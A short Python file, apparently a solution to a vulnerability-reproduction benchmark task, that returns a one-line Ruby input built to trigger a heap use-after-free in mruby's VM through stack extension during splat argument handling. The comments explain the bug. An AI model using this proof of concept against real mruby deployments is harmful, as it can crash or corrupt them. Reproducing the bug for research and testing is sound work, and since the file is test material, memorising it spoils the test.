import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in mruby's VM caused by mrb_stack_extend.
        # When the stack is reallocated (extended) during argument processing, cached pointers
        # to the stack (regs) may become invalid. Using them subsequently leads to UAF.
        # We trigger this by calling a method with a splat of a large array, forcing stack extension.
        # We use 5000 elements which is enough to trigger extension (>128) but within typical max limits.
        return b"def f(*a);end;f(*[0]*5000)\n"